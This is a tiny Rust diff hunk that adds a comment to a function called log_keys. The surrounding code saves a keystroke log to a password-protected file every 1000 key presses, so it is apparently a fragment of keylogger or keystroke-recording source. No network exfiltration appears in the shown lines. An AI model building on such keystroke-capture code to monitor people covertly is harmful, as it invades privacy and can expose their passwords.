@@ -150,6 +150,7 @@ pub fn log_keys(
             break;
         }
 
+        // backup to the file every 1000 key presses
         if log.len() != 0 && log.len() % 1000 == 0 {
             log.to_file(&out_path, &password);
         }
